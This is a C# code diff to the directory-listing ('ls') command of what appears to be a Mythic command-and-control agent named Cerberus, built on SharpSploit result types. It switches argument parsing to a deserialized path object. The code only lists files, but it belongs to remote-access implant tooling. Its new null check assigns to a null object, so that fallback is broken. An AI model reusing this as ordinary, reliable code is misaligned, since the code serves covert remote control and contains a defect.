@@ -3,6 +3,7 @@ using Cerberus.Models.Tasks;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Text;
 
 namespace Cerberus.Commands
 {
@@ -13,19 +14,14 @@ namespace Cerberus.Commands
         public override string Execute(MythicTask task)
         {
             var results = new SharpSploitResultList<ListDirectoryResult>();
-            var Arguments = task.parameters.Split(' ');
-            string path;
+            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<LsParam>();
 
-            if (Arguments is null || Arguments.Length == 0)
+            if (Arguments is null || string.IsNullOrWhiteSpace(Arguments.path))
             {
-                path = Directory.GetCurrentDirectory();
-            }
-            else
-            {
-                path = Arguments[0];
+                Arguments.path = Directory.GetCurrentDirectory();
             }
 
-            var files = Directory.GetFiles(path);
+            var files = Directory.GetFiles(Arguments.path);
 
             foreach (var file in files)
             {
@@ -37,7 +33,7 @@ namespace Cerberus.Commands
                 });
             }
 
-            var directories = Directory.GetDirectories(path);
+            var directories = Directory.GetDirectories(Arguments.path);
 
             foreach (var directory in directories)
             {
@@ -62,6 +58,11 @@ namespace Cerberus.Commands
                 new SharpSploitResultProperty{Name = nameof(Name), Value = Name},
                 new SharpSploitResultProperty{Name = nameof(Length), Value = Length}
             };
+        }
+
+        public class LsParam
+        {
+            public string path { get; set; }
         }
     }
 }
